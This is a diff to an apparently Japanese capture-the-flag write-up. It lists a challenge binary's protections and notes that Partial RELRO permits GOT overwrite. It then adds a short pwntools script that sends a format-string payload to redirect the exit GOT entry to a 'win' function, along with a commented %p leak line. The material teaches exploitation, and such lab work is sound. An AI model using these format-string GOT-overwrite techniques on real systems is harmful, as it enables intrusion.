@@ -11,6 +11,16 @@ Stack:    Canary found
 NX:       NX enabled
 PIE:      No PIE (0x400000)
 ```
-
 - Partial RELRO は GOT overwrite が使える
-
+```python
+#!/usr/bin/env python3
+from pwn import *
+exe = context.binary = ELF('./chall')
+io = process([exe.path])
+log.info(str(io.recvuntil(b'> ')))
+# io.sendline(b"AAAAAAAA,"+bytes(",".join(["%p" for _ in range(20)]), "utf-8"))
+io.sendline(fmtstr_payload(6, {
+    exe.got['exit']: exe.symbols['win']
+}))
+log.info(str(io.recvall()))
+```
